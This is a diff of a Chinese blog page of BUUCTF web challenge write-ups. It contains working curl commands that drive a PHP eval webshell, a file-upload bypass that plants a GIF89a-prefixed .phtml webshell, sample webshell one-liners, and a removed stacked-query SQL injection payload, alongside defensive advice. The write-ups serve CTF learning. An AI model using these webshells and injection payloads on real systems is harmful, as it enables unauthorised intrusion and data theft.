-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;7acd36c9-1cbb-4e30-8ee5-339726d381d2&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<h3 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h3><ul>
+<li><strong>Server:</strong> openresty (nginx + Lua)</li>
+<li><strong>PHP版本:</strong> 5.5.9-1ubuntu4.29（旧版本）</li>
+<li><strong>后端:</strong> PHP&#x2F;5.5.9</li>
+</ul>
 <hr>
-<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-堆叠查询（Stacked-Queries）"><a href="#1-堆叠查询（Stacked-Queries）" class="headerlink" title="1. 堆叠查询（Stacked Queries）"></a>1. 堆叠查询（Stacked Queries）</h3><p>在SQL注入中，使用分号<code>;</code>分隔多个SQL语句，可以执行额外的查询。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; --</span></span><br></pre></td></tr></table></figure>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="1-使用-webshell-执行系统命令"><a href="#1-使用-webshell-执行系统命令" class="headerlink" title="1. 使用 webshell 执行系统命令"></a>1. 使用 webshell 执行系统命令</h3><p>通过 POST 参数 <code>Syc</code> 发送 <code>system(&#39;ls -la&#39;);</code> 列出当前目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;Syc=system(&#x27;ls -la&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-MySQL-MariaDB-特殊表名处理"><a href="#2-MySQL-MariaDB-特殊表名处理" class="headerlink" title="2. MySQL&#x2F;MariaDB 特殊表名处理"></a>2. MySQL&#x2F;MariaDB 特殊表名处理</h3><p>当表名是数字或包含特殊字符时，需要用<strong>反引号</strong>包裹：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;</span><br></pre></td></tr></table></figure>
+<p><strong>结果:</strong> 当前目录只有 <code>index.php</code></p>
+<h3 id="2-搜索-flag-文件"><a href="#2-搜索-flag-文件" class="headerlink" title="2. 搜索 flag 文件"></a>2. 搜索 flag 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;Syc=system(&#x27;find / -name flag* 2&gt;/dev/null&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-Handler语句"><a href="#3-Handler语句" class="headerlink" title="3. Handler语句"></a>3. Handler语句</h3><p>MySQL的<code>handler</code>语句提供了一种直接访问表存储引擎的接口，可以绕过SELECT关键字限制：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler table_name <span class="keyword">open</span>;      <span class="comment">-- 打开表</span></span><br><span class="line">handler table_name read <span class="keyword">first</span>; <span class="comment">-- 读取第一条记录</span></span><br><span class="line">handler table_name read next;  <span class="comment">-- 读取下一条记录</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:</strong> 发现 <code>/flag</code> 文件</p>
+<h3 id="3-读取-flag"><a href="#3-读取-flag" class="headerlink" title="3. 读取 flag"></a>3. 读取 flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://c10e41e9-cfcb-4d2e-a6b5-5ea9d134fd28.node5.buuoj.cn:81/&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;Syc=system(&#x27;cat /flag&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="4-常用绕过技巧"><a href="#4-常用绕过技巧" class="headerlink" title="4. 常用绕过技巧"></a>4. 常用绕过技巧</h3><table>
+<p><strong>Flag:</strong> <code>flag{1d2f60bc-c6bb-4bfc-8fb3-9549e740dc09}</code></p>
+<hr>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-一句话木马（Webshell）"><a href="#1-一句话木马（Webshell）" class="headerlink" title="1. 一句话木马（Webshell）"></a>1. 一句话木马（Webshell）</h3><p>一句话木马是一种短小精悍的 web 后门脚本，通常由以下几个要素组成：</p>
+<table>
 <thead>
 <tr>
-<th>过滤</th>
-<th>绕过方法</th>
+<th>要素</th>
+<th>作用</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>select</td>
-<td>handler语句、预编译语句、重命名表+alter字段</td>
+<td><code>eval()</code></td>
+<td>将字符串作为 PHP 代码执行</td>
 </tr>
 <tr>
-<td>set&#x2F;prepare</td>
-<td>concat+char编码、十六进制编码</td>
+<td><code>$_POST[&quot;Syc&quot;]</code></td>
+<td>接收用户通过 POST 方法提交的数据</td>
 </tr>
 <tr>
-<td>where</td>
-<td>HAVING、LIMIT OFFSET</td>
+<td>木马上传&#x2F;植入</td>
+<td>攻击者通过文件上传、SQL注入、或已有漏洞植入</td>
 </tr>
 </tbody></table>
-<h3 id="5-表重命名攻击"><a href="#5-表重命名攻击" class="headerlink" title="5. 表重命名攻击"></a>5. 表重命名攻击</h3><p>当原查询只返回特定字段时，可以将flag表重命名为原查询的表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> words <span class="keyword">to</span> words1;</span><br><span class="line">rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter table</span> words change flag id <span class="type">varchar</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+<p>常见的 webshell 形式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="2-PHP-eval-函数"><a href="#2-PHP-eval-函数" class="headerlink" title="2. PHP eval() 函数"></a>2. PHP <code>eval()</code> 函数</h3><ul>
+<li><code>eval()</code> 把传入的字符串当作 PHP 代码执行</li>
+<li>非常危险，在实际开发中应避免使用</li>
+<li>本题中该函数被用于接收用户输入的任意代码</li>
+</ul>
+<h3 id="3-CTF-解题思路"><a href="#3-CTF-解题思路" class="headerlink" title="3. CTF 解题思路"></a>3. CTF 解题思路</h3><p>对于提供了 webshell 的题目，一般流程：</p>
+<ol>
+<li><strong>确认 webshell 存在</strong> - 通过 POST 发送测试指令</li>
+<li><strong>执行系统命令</strong> - 利用 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code> 等函数</li>
+<li><strong>查找 flag 位置</strong> - 使用 <code>find / -name flag*</code> 或 <code>grep -r flag /</code> 搜索</li>
+<li><strong>读取 flag</strong> - 使用 <code>cat</code> 命令读取</li>
+</ol>
+<h3 id="4-curl-常用参数"><a href="#4-curl-常用参数" class="headerlink" title="4. curl 常用参数"></a>4. curl 常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s</code></td>
+<td>静默模式，不显示进度信息</td>
+</tr>
+<tr>
+<td><code>-d &quot;key=val&quot;</code></td>
+<td>发送 POST 请求，传递数据</td>
+</tr>
+<tr>
+<td><code>-X POST</code></td>
+<td>指定请求方法为 POST（<code>-d</code> 会自动使用 POST）</td>
+</tr>
+</tbody></table>
 <hr>
-<h2 id="完整Payload"><a href="#完整Payload" class="headerlink" title="完整Payload"></a>完整Payload</h2><p><strong>获取flag的最终payload：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;handler `1919810931114514` open;handler `1919810931114514` read first;-- </span><br></pre></td></tr></table></figure>
-
-<p>URL编码后：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1%27%3Buse%20supersqli%3Bhandler%20%601919810931114514%60%20open%3Bhandler%20%601919810931114514%60%20read%20first%3B--%20</span><br></pre></td></tr></table></figure>
-
+<h2 id="常见疑问：为什么-Syc-后面不能直接加命令，而是加上-system-？"><a href="#常见疑问：为什么-Syc-后面不能直接加命令，而是加上-system-？" class="headerlink" title="常见疑问：为什么 Syc 后面不能直接加命令，而是加上 system()？"></a>常见疑问：为什么 Syc 后面不能直接加命令，而是加上 <code>system()</code>？</h2><p>这是一个很关键的理解点。<strong><code>eval()</code> 执行的是 PHP 代码，不是 shell 命令。</strong></p>
+<p><code>eval($_POST[&quot;Syc&quot;]);</code> 等价于把 <code>$_POST[&quot;Syc&quot;]</code> 的内容当作 PHP 代码来执行。</p>
+<p>所以：</p>
+<table>
+<thead>
+<tr>
+<th>你发送的 Syc 值</th>
+<th>eval() 实际执行的代码</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls -la</code></td>
+<td><code>eval(&quot;ls -la&quot;);</code></td>
+<td>❌ PHP 语法错误 — <code>ls -la</code> 不是合法的 PHP 语句</td>
+</tr>
+<tr>
+<td><code>system(&#39;ls -la&#39;);</code></td>
+<td><code>eval(&quot;system(&#39;ls -la&#39;);&quot;);</code></td>
+<td>✅ 调用了 PHP 的 <code>system()</code> 函数来执行 shell 命令</td>
+</tr>
+</tbody></table>
+<p><code>ls -la</code> 是 <strong>shell 命令</strong>，但 <code>eval()</code> 期望的是 <strong>PHP 代码</strong>。PHP 和 shell 是两门不同的语言，所以必须用 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code> 等 PHP 内置函数来桥接，告诉 PHP “把这串东西当成 shell 命令去跑”。</p>
+<p>简单说就是：<strong><code>eval()</code> 听不懂 shell，只听得懂 PHP。<code>system()</code> 就是那个翻译官。</strong></p>
 <hr>
-<h2 id="题目启示"><a href="#题目启示" class="headerlink" title="题目启示"></a>题目启示</h2><ol>
-<li><strong>开发和安全缺一不可</strong>：过滤了常见SQL关键字，但忽略了其他SQL语句（如handler）</li>
-<li><strong>sqlmap不是万能的</strong>：手工注入能发现自动化工具遗漏的漏洞点</li>
-<li><strong>堆叠查询的危险性</strong>：即使某些关键字被过滤，堆叠查询仍可能导致数据泄露</li>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
+<li>实际渗透测试中，发现 webshell 需要进一步排查系统是否被植入其他后门</li>
+<li>本题是 CTF 竞赛题目，在授权的环境中进行学习</li>
+<li><code>eval()</code> 在真实项目中应被严格禁止使用</li>
 </ol>
 
       
@@ -1024,7 +1143,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/1-easySQL/">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/8-%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dupload2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/saber.jpg">
@@ -1038,7 +1157,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/05/02/BUUCTF/WEB/1-easySQL/" class="post-title-link" itemprop="url">CTF WriteUp: [极客大挑战 2019] EasySQL</a>
+            <a href="/2026/05/02/BUUCTF/WEB/8-%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dupload2/" class="post-title-link" itemprop="url">8-[ACTF2020 新生赛]upload2</a>
         </h2>
 
         <div class="post-meta">
@@ -1055,7 +1174,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:46:35" itemprop="dateModified" datetime="2026-05-03T12:46:35+08:00">2026-05-03</time>
+                <time title="修改时间：2026-05-03 12:50:50" itemprop="dateModified" datetime="2026-05-03T12:50:50+08:00">2026-05-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1082,41 +1201,497 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><img src="/assets/file-20260503034103228.png"></p>
-<h1 id="CTF-WriteUp-极客大挑战-2019-EasySQL"><a href="#CTF-WriteUp-极客大挑战-2019-EasySQL" class="headerlink" title="CTF WriteUp: [极客大挑战 2019] EasySQL"></a>CTF WriteUp: [极客大挑战 2019] EasySQL</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
-<li><strong>题目名称</strong>：EasySQL</li>
+          <h1 id="ACTF2020-新生赛-upload2"><a href="#ACTF2020-新生赛-upload2" class="headerlink" title="[ACTF2020 新生赛]upload2"></a>[ACTF2020 新生赛]upload2</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li>题目类型：文件上传漏洞</li>
+<li>服务器：openresty (nginx) + PHP 5.6.40</li>
+<li>目标：<a target="_blank" rel="noopener" href="http://2ac2adb1-af92-4b3d-bf61-0029f2a18591.node5.buuoj.cn:81/">http://2ac2adb1-af92-4b3d-bf61-0029f2a18591.node5.buuoj.cn:81/</a></li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><p>访问目标页面，发现是一个文件上传表单，前端 JS 限制了只能上传 <code>.jpg</code>、<code>.png</code>、<code>.gif</code> 文件。</p>
+<p>但前端限制只是客户端的，可以用 <code>curl</code> 直接发送 POST 请求绕过。</p>
+<p>查看上传页面的前端校验代码 <code>./js/main.js</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传jpg、png、gif结尾的图片噢！&quot;</span>;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-测试服务端黑名单"><a href="#2-测试服务端黑名单" class="headerlink" title="2. 测试服务端黑名单"></a>2. 测试服务端黑名单</h3><p>用 curl 直接绕过前端限制，测试各种后缀：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试上传 .php —— 被拦截</span></span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; /tmp/test.php</span><br><span class="line">curl -s -F &quot;upload_file=@/tmp/test.php&quot; -F &quot;submit=upload&quot; http://.../</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回: nonono~ Bad file！</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试上传 .php5 —— 被拦截</span></span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; /tmp/test.php5</span><br><span class="line">curl -s -F &quot;upload_file=@/tmp/test.php5&quot; -F &quot;submit=upload&quot; http://.../</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回: nonono~ Bad file！</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试上传 .php3 —— 被拦截</span></span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; /tmp/test.php3</span><br><span class="line">curl -s -F &quot;upload_file=@/tmp/test.php3&quot; -F &quot;submit=upload&quot; http://.../</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回: nonono~ Bad file！</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试上传 .phtml —— 成功！PHP代码被执行</span></span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; /tmp/test.phtml</span><br><span class="line">curl -s -F &quot;upload_file=@/tmp/test.phtml&quot; -F &quot;submit=upload&quot; http://.../</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回: Upload Success! Look here~ ./uplo4d/xxx.phtml</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现：</strong> <code>.phtml</code> 后缀成功通过服务端校验，并且可以执行 PHP 代码。</p>
+<p>说明服务端用的是黑名单过滤，只拦截 <code>.php</code>、<code>.php3</code>、<code>.php4</code>、<code>.php5</code> 等常见后缀，但没有拦截 <code>.phtml</code>。</p>
+<blockquote>
+<p><code>.phtml</code> 是 PHP 支持的另一种后缀名，在部分服务器配置中可以被解析执行 PHP 代码。</p>
+</blockquote>
+<h3 id="3-确认PHP环境状态"><a href="#3-确认PHP环境状态" class="headerlink" title="3. 确认PHP环境状态"></a>3. 确认PHP环境状态</h3><p>访问上传的 <code>.phtml</code> 页面查看 phpinfo 获得关键信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://.../uplo4d/xxx.phtml</span><br></pre></td></tr></table></figure>
+
+<p>关键信息：</p>
+<ul>
+<li><code>disable_functions</code> &#x3D; <strong>no value</strong>（没有任何函数被禁用）</li>
+<li><code>open_basedir</code> &#x3D; <strong>no value</strong>（没有目录访问限制）</li>
+<li><code>Document_ROOT</code> &#x3D; <code>/var/www/html</code></li>
+</ul>
+<h3 id="4-上传-Webshell"><a href="#4-上传-Webshell" class="headerlink" title="4. 上传 Webshell"></a>4. 上传 Webshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建包含 GIF 文件头的小马，绕过可能的内容检查</span></span><br><span class="line">echo &#x27;GIF89a&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; /tmp/shell.phtml</span><br><span class="line">curl -s -F &quot;upload_file=@/tmp/shell.phtml&quot; -F &quot;submit=upload&quot; http://.../</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回: Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-获取Flag"><a href="#5-获取Flag" class="headerlink" title="5. 获取Flag"></a>5. 获取Flag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出根目录</span></span><br><span class="line">curl -s -X POST -d &quot;cmd=system(&#x27;ls -la /&#x27;);&quot; \</span><br><span class="line">  http://.../uplo4d/bd914ca4997d34857501cefab0064162.phtml</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现 /flag 文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取 flag</span></span><br><span class="line">curl -s -X POST -d &quot;cmd=system(&#x27;cat /flag&#x27;);&quot; \</span><br><span class="line">  http://.../uplo4d/bd914ca4997d34857501cefab0064162.phtml</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag:</strong> <code>flag{a074881a-5854-4864-9534-f9c713fe4041}</code></p>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-文件上传绕过技术"><a href="#1-文件上传绕过技术" class="headerlink" title="1. 文件上传绕过技术"></a>1. 文件上传绕过技术</h3><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端JS绕过</td>
+<td>直接构造 POST 请求，不经过浏览器</td>
+</tr>
+<tr>
+<td>扩展名黑名单绕过</td>
+<td>使用 <code>.phtml</code>、<code>.php5</code>、<code>.shtml</code> 等替代后缀</td>
+</tr>
+<tr>
+<td>文件头绕过</td>
+<td>添加 <code>GIF89a</code> 等图片文件头骗过 <code>getimagesize()</code> 等函数</td>
+</tr>
+<tr>
+<td>双写扩展名</td>
+<td><code>a.php.jpg</code>、<code>a.jpg.php</code></td>
+</tr>
+<tr>
+<td>大小写绕过</td>
+<td><code>.PHP</code>、<code>.Php</code></td>
+</tr>
+<tr>
+<td>末尾特殊字符</td>
+<td>空格、点、<code>::$DATA</code>(Windows)</td>
+</tr>
+</tbody></table>
+<h3 id="2-常见PHP可解析后缀"><a href="#2-常见PHP可解析后缀" class="headerlink" title="2. 常见PHP可解析后缀"></a>2. 常见PHP可解析后缀</h3><p>PHP 可解析的后缀不仅限于 <code>.php</code>，还包括：</p>
+<ul>
+<li><code>.php3</code>、<code>.php4</code>、<code>.php5</code>、<code>.php7</code>（不同PHP版本）</li>
+<li><code>.phtml</code>（PHP + HTML混编）</li>
+<li><code>.pht</code></li>
+<li><code>.shtml</code>（需服务器配置）</li>
+</ul>
+<h3 id="3-检查服务器环境"><a href="#3-检查服务器环境" class="headerlink" title="3. 检查服务器环境"></a>3. 检查服务器环境</h3><p>通过 phpinfo() 可以获取：</p>
+<ul>
+<li><code>disable_functions</code>：被禁用的PHP函数</li>
+<li><code>open_basedir</code>：目录访问限制</li>
+<li><code>Document_ROOT</code>：Web根目录路径</li>
+<li><code>allow_url_include</code>：是否允许远程文件包含</li>
+</ul>
+<h3 id="4-curl-上传文件命令"><a href="#4-curl-上传文件命令" class="headerlink" title="4. curl 上传文件命令"></a>4. curl 上传文件命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -F &quot;upload_file=@/path/to/file&quot; -F &quot;submit=upload&quot; URL</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-F</code> 表示 form 数据，<code>@</code> 表示文件内容</li>
+<li>文件名会保留原文件名</li>
+</ul>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><ol>
+<li>使用<strong>白名单</strong>而非黑名单校验文件扩展名</li>
+<li>使用 <code>finfo</code> 或 <code>getimagesize()</code> 验证文件 MIME 类型</li>
+<li>上传文件重命名，不使用用户提供的文件名</li>
+<li>文件存储目录设置为不可执行脚本</li>
+<li>使用 <code>.htaccess</code> 限制上传目录的 PHP 解析</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/9-BabySQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/02/BUUCTF/WEB/9-BabySQL/" class="post-title-link" itemprop="url">9-BabySQL</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-05-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-02T00:00:00+08:00">2026-05-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-05-03 12:50:53" itemprop="dateModified" datetime="2026-05-03T12:50:53+08:00">2026-05-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUUCTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CTF-WriteUp-BabySQL"><a href="#CTF-WriteUp-BabySQL" class="headerlink" title="CTF WriteUp: BabySQL"></a>CTF WriteUp: BabySQL</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li><strong>题目名称</strong>：BabySQL</li>
 <li><strong>题目类型</strong>：Web (SQL注入)</li>
-<li><strong>目标地址</strong>：<a target="_blank" rel="noopener" href="http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/">http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/</a></li>
+<li><strong>目标地址</strong>：<a target="_blank" rel="noopener" href="http://74f8f143-fc8e-4009-be51-7453322f3bc1.node5.buuoj.cn:81/">http://74f8f143-fc8e-4009-be51-7453322f3bc1.node5.buuoj.cn:81/</a></li>
 </ul>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
-<li><strong>SQL注入 (SQL Injection)</strong>：攻击者在 Web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，以此来实现欺骗数据库服务器执行非授权的任意查询。</li>
-<li><strong>万能密码 (Authentication Bypass)</strong>：利用 SQL 语句的逻辑漏洞（如 <code>OR 1=1</code> 永真条件），绕过登录验证。</li>
-<li><strong>闭合与注释</strong>：<ul>
